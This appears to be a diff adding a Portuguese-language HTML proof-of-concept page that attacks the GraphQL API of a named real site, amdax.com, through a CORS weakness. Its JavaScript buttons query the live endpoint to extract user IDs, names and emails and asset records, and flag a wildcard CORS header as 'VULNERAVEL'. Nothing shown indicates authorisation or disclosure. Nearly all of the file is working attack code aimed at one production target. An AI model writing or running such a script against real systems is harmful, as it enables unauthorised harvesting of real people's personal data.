@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Amdax PoC Simples</title>
+<style>
+body{font-family:monospace;background:#111;color:#0f0;padding:20px;max-width:800px;margin:0 auto}
+h1{color:#f44}
+button{background:#f44;color:#fff;border:none;padding:10px 20px;cursor:pointer;font-size:16px;margin:5px}
+pre{background:#000;padding:10px;border:1px solid #333;overflow:auto;max-height:500px;font-size:13px}
+.success{color:#0f0}.error{color:#f44}.info{color:#88f}
+</style>
+</head><body>
+<h1>Amdax CORS + GraphQL PoC</h1>
+<p class="info">Testes contra https://www.amdax.com/api</p>
+<hr>
+
+<button onclick="test1()">Teste 1: Ping (__typename)</button>
+<button onclick="test2()">Teste 2: Extrair Usuarios</button>
+<button onclick="test3()">Teste 3: Extrair Assets</button>
+<button onclick="test4()">Teste 4: Verificar CORS</button>
+<button onclick="limpar()">Limpar</button>
+
+<pre id="log">Clique em um botao para testar.
+Resultados aparecerao aqui.
+</pre>
+
+<script>
+const API = 'https://www.amdax.com/api';
+const log = document.getElementById('log');
+
+function add(text, cls='') {
+    log.innerHTML += `<span class="${cls}">${text}</span>\n`;
+    log.scrollTop = log.scrollHeight;
+}
+
+async function req(query) {
+    const resp = await fetch(API, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({query})
+    });
+    const txt = await resp.text();
+    return { status: resp.status, data: txt, headers: resp.headers };
+}
+
+async function test1() {
+    add('>>> Ping (__typename)...', 'info');
+    try {
+        const r = await req('{ __typename }');
+        add(`HTTP ${r.status}`);
+        add(r.data.slice(0, 300));
+        if (r.data.includes('"data"')) add('SUCESSO: API respondendo!', 'success');
+    } catch(e) { add(`ERRO: ${e.message}`, 'error'); }
+}
+
+async function test2() {
+    add('>>> Extraindo usuarios...', 'info');
+    try {
+        const r = await req('{ users(limit:10) { id name email } }');
+        add(`HTTP ${r.status}`);
+        const json = JSON.parse(r.data);
+        const users = json?.data?.users || [];
+        add(`Encontrados: ${users.length} usuarios`, 'success');
+        users.forEach((u,i) => add(`[${i+1}] ${u.name} <${u.email}> (ID: ${u.id})`));
+        // Check CORS headers
+        const acao = r.headers.get('access-control-allow-origin');
+        if (acao) add(`CORS ACAO: ${acao}`, 'info');
+    } catch(e) { add(`ERRO: ${e.message}`, 'error'); }
+}
+
+async function test3() {
+    add('>>> Extraindo assets...', 'info');
+    try {
+        const r = await req('{ assets(limit:10) { id name } }');
+        add(`HTTP ${r.status}`);
+        const json = JSON.parse(r.data);
+        const assets = json?.data?.assets || [];
+        add(`Encontrados: ${assets.length} assets`, 'success');
+        assets.forEach((a,i) => add(`[${i+1}] ${a.name} (ID: ${a.id})`));
+    } catch(e) { add(`ERRO: ${e.message}`, 'error'); }
+}
+
+async function test4() {
+    add('>>> Verificando CORS via POST response...', 'info');
+    try {
+        const resp = await fetch(API, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({query: '{ __typename }'})
+        });
+        add(`HTTP ${resp.status}`);
+        // Read CORS headers from response
+        const acao = resp.headers.get('access-control-allow-origin');
+        const acc = resp.headers.get('access-control-allow-credentials');
+        if (acao) add(`Access-Control-Allow-Origin: ${acao}`, acao === '*' ? 'error' : 'info');
+        if (acc) add(`Access-Control-Allow-Credentials: ${acc}`, acc === 'true' ? 'error' : 'info');
+        if (acao === '*') add('VULNERAVEL: ACAO: * com dados retornados!', 'error');
+        const txt = await resp.text();
+        add('Resposta: ' + txt.slice(0, 100));
+    } catch(e) { add(`ERRO: ${e.message}`, 'error'); }
+}
+
+function limpar() {
+    log.innerHTML = 'Log limpo.\n';
+}
+</script>
+</body></html>
